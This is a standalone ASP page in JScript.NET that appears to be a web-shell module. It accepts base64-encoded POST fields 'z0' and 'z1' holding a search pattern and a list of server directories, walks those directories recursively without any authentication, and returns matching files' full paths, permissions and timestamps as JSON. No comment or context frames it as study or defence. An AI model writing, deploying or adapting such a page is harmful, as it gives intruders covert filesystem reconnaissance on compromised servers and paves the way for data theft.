<%

function base64Decode(str) {
    if (!str || str.Trim() == "") return "";
    try {
        var bytes = System.Convert.FromBase64String(str);
        return System.Text.Encoding.UTF8.GetString(bytes);
    } catch(e) { return ""; }
}

function jsonEscape(str) {
    if (!str) return "";
    return str.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r\n", "\\n").Replace("\r", "\\n").Replace("\n", "\\n");
}

function getPermission(attributes, isDirectory, name) {
    var p = "Read";
    if ((attributes & 1) != 1) {
        p += ",Write";
    }
    
    if (!isDirectory && name) {
        var fName = name.ToLower();
        if (fName.EndsWith(".exe") || fName.EndsWith(".bat") || fName.EndsWith(".cmd")) {
            p += ",Execute";
        }
    }
    return p;
}

function buildItemJson(info, isDirectory) {
    var dateFmt = "yyyy/MM/dd HH:mm:ss";
    var json = "{";
    json += "\"name\":\"" + jsonEscape(info.Name) + "\",";
    json += "\"path\":\"" + jsonEscape(info.FullName) + "\",";
    json += "\"type\":\"" + (isDirectory ? "Directory" : "File") + "\",";
    json += "\"permission\":\"" + getPermission(info.Attributes, isDirectory, info.Name) + "\",";
    json += "\"created\":\"" + info.CreationTime.ToString(dateFmt) + "\",";
    json += "\"last_modified\":\"" + info.LastWriteTime.ToString(dateFmt) + "\",";
    json += "\"last_accessed\":\"" + info.LastAccessTime.ToString(dateFmt) + "\"";
    json += "}";
    return json;
}

function searchDirectoryRecursive(dirInfo, regex, resultsList) {
    try {
        var files = dirInfo.GetFiles();
        for (var i = 0; i < files.Length; i++) {
            if (regex.IsMatch(files[i].Name)) {
                resultsList.Add(buildItemJson(files[i], false));
            }
        }
    } catch(e) {  }

    try {
        var subDirs = dirInfo.GetDirectories();
        for (var j = 0; j < subDirs.Length; j++) {
            if (regex.IsMatch(subDirs[j].Name)) {
                resultsList.Add(buildItemJson(subDirs[j], true));
            }
            
            searchDirectoryRecursive(subDirs[j], regex, resultsList);
        }
    } catch(e) {  }
}

function convertToRegexpPattern(rawPattern) {
    var p = rawPattern.Trim();
    if (p.indexOf("*") > -1 || p.indexOf("?") > -1) {
        p = p.Replace(".", "\\.");
        p = p.Replace("*", ".*");
        p = p.Replace("?", ".");
        return "^" + p + "$";
    } else {
        if (p.StartsWith("#") || p.StartsWith("/")) {
            p = p.Substring(1);
            if (p.EndsWith("i") || p.EndsWith("#") || p.EndsWith("/")) {
                p = p.Substring(0, p.Length - 1);
                if (p.EndsWith("#") || p.EndsWith("/")) {
                    p = p.Substring(0, p.Length - 1);
                }
            }
        }
        return p;
    }
}

Response.Buffer = true;
Response.ContentType = "application/json";

var z0 = Request.Form["z0"] ? Request.Form["z0"] + "" : "";
var z1 = Request.Form["z1"] ? Request.Form["z1"] + "" : "";

if (z1.Trim() == "") {
    Response.Write("{\"status\":false,\"msg\":\"No parameters received\"}");
} else {
    try {
        var decodedRegex = base64Decode(z0);
        var decodedDirs = base64Decode(z1);

        var pattern = convertToRegexpPattern(decodedRegex);
        var regex = new System.Text.RegularExpressions.Regex(pattern, System.Text.RegularExpressions.RegexOptions.IgnoreCase);

        var resultsList = new System.Collections.ArrayList();
        var dirsArray = decodedDirs.split(",");

        for (var d = 0; d < dirsArray.length; d++) {
            var path = dirsArray[d].Trim();
            if (path != "" && System.IO.Directory.Exists(path)) {
                var startDir = new System.IO.DirectoryInfo(path);
                searchDirectoryRecursive(startDir, regex, resultsList);
            }
        }

        if (resultsList.Count == 0) {
            Response.Write("{\"status\":true,\"results\":[]}");
        } else {
            var jsonResults = "";
            for (var r = 0; r < resultsList.Count; r++) {
                jsonResults += resultsList[r];
                if (r < resultsList.Count - 1) {
                    jsonResults += ",";
                }
            }
            Response.Write("{\"status\":true,\"results\":[" + jsonResults + "]}");
        }

    } catch(e) {
        Response.Write("{\"status\":false,\"msg\":\"" + jsonEscape(e.message) + "\"}");
    }
}

%>